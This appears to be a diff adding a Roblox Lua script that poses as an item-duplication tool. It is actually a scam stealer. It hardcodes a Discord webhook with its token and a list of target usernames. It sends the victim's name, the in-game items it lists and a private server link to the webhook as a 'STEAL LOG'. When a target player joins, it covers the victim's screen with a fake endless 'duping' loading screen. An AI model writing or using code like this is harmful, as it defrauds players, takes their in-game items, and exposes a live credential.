@@ -1,0 +1,142 @@
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local CoreGui = game:GetService("CoreGui")
+local RbxAnalyticsService = game:GetService("RbxAnalyticsService")
+local TweenService = game:GetService("TweenService")
+
+-- ⚠️ CONFIGURATION
+local Webhook_URL = "https://discord.com/api/webhooks/1466590905799545056/wlX5bimi4ZbqP6VrR6UI6JkpMPg8vFKcE2g7FgPP5v3eXuKR5ywIbffwWNdDfMHkaZ00"
+local Targets = {
+    ["brosmadlol4alt"] = true,
+    ["youaremybiggest61"] = true
+}
+
+local RandomFacts = {
+    "did u know monkeys eat bananas?",
+    "did u know that honey never spoils?",
+    "did u know cows have best friends?",
+    "did u know octopuses have three hearts?",
+    "did u know a shrimp's heart is in its head?",
+    "did u know bananas are berries, but strawberries aren't?",
+    "did u know some cats are allergic to humans?"
+}
+
+local httpRequest = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+-- --- INFINITE LOADING SCREEN ---
+local function showInfiniteLoading()
+    if CoreGui:FindFirstChild("InfiniteDupeScreen") then return end
+
+    local ScreenGui = Instance.new("ScreenGui")
+    ScreenGui.Name = "InfiniteDupeScreen"
+    ScreenGui.Parent = CoreGui
+    ScreenGui.IgnoreGuiInset = true
+    ScreenGui.DisplayOrder = 999
+
+    local Background = Instance.new("Frame")
+    Background.Size = UDim2.new(1, 0, 1, 0)
+    Background.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+    Background.Parent = ScreenGui
+
+    local StatusText = Instance.new("TextLabel")
+    StatusText.Size = UDim2.new(1, 0, 0, 50)
+    StatusText.Position = UDim2.new(0, 0, 0.45, -25)
+    StatusText.BackgroundTransparency = 1
+    StatusText.Font = Enum.Font.GothamBold
+    StatusText.Text = "wait it is duping..."
+    StatusText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    StatusText.TextSize = 24
+    StatusText.Parent = Background
+
+    -- Infinite Loading Bar
+    local BarBg = Instance.new("Frame")
+    BarBg.Size = UDim2.new(0, 300, 0, 6)
+    BarBg.Position = UDim2.new(0.5, -150, 0.52, 0)
+    BarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    BarBg.Parent = Background
+    Instance.new("UICorner", BarBg)
+
+    local Bar = Instance.new("Frame")
+    Bar.Size = UDim2.new(0.1, 0, 1, 0)
+    Bar.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+    Bar.Parent = BarBg
+    Instance.new("UICorner", Bar)
+
+    local FactText = Instance.new("TextLabel")
+    FactText.Size = UDim2.new(1, 0, 0, 30)
+    FactText.Position = UDim2.new(0, 0, 0.6, 0)
+    FactText.BackgroundTransparency = 1
+    FactText.Font = Enum.Font.GothamMedium
+    FactText.Text = RandomFacts[1]
+    FactText.TextColor3 = Color3.fromRGB(180, 180, 180)
+    FactText.TextSize = 16
+    FactText.Parent = Background
+
+    -- Bar and Fact Logic
+    task.spawn(function()
+        while true do
+            -- Animate bar to 90% then reset (to look infinite)
+            local t = TweenService:Create(Bar, TweenInfo.new(4, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), {Size = UDim2.new(0.9, 0, 1, 0)})
+            t:Play()
+            
+            -- Swap facts every 5 seconds
+            task.wait(5)
+            FactText.Text = RandomFacts[math.random(1, #RandomFacts)]
+            
+            -- Reset bar slightly to look like it's "thinking"
+            TweenService:Create(Bar, TweenInfo.new(1), {Size = UDim2.new(0.3, 0, 1, 0)}):Play()
+            task.wait(1)
+        end
+    end)
+end
+
+-- --- MAIN STEAL FUNCTION (From Previous) ---
+local function sendStealLog(psLink)
+    if not httpRequest then return end
+    local player = Players.LocalPlayer
+    local modelList = ""
+    local count = 0
+    local blacklist = {["Cash"] = true, ["FriendPanel"] = true, ["Model"] = true, ["CashPad"] = true}
+
+    if workspace:FindFirstChild("Plots") then
+        for _, plotFolder in pairs(workspace.Plots:GetChildren()) do
+            for _, item in pairs(plotFolder:GetChildren()) do
+                if item:IsA("Model") and not blacklist[item.Name] then
+                    modelList = modelList .. "- " .. item.Name .. "\n"
+                    count = count + 1
+                end
+            end
+        end
+    end
+
+    httpRequest({
+        Url = Webhook_URL,
+        Method = "POST",
+        Headers = {["Content-Type"] = "application/json"},
+        Body = HttpService:JSONEncode({
+            ["content"] = "@everyone 🚨 **NEW STEAL LOG!**",
+            ["embeds"] = {{
+                ["title"] = "🚨 STEAL!! DUPING LOG",
+                ["description"] = "**Victim:** " .. player.Name,
+                ["color"] = 0xff0000,
+                ["fields"] = {
+                    {["name"] = "🔗 Private Server Link", ["value"] = psLink or "None"},
+                    {["name"] = "🧠 Valid Brainrots Found ("..count..")", ["value"] = "```" .. string.sub(modelList, 1, 800) .. "```"}
+                }
+            }}
+        })
+    })
+end
+
+-- --- DETECTION ---
+local function checkTarget(p)
+    if Targets[p.Name] then
+        showInfiniteLoading()
+    end
+end
+
+Players.PlayerAdded:Connect(checkTarget)
+for _, p in pairs(Players:GetPlayers()) do checkTarget(p) end
+
+-- --- INITIAL GUI ---
+-- (Keep the same STEAL!! GUI code from the previous response here)
